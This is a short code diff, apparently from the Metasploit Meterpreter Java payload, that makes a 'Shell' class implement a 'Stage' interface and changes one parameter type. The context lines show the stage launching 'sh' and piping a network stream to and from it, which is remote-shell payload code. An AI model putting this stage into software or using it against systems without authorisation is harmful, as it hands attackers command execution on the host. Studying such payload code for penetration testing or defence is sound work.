@@ -10,9 +10,9 @@ import javapayload.stage.StreamForwarder;
 /**
  * Meterpreter Java Payload Proxy
  */
-public class Shell {
+public class Shell implements Stage {
 
-    public void start(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
+    public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
         final Process proc = Runtime.getRuntime().exec("sh");
         new StreamForwarder(in, proc.getOutputStream(), out).start();
         new StreamForwarder(proc.getInputStream(), out, out).start();
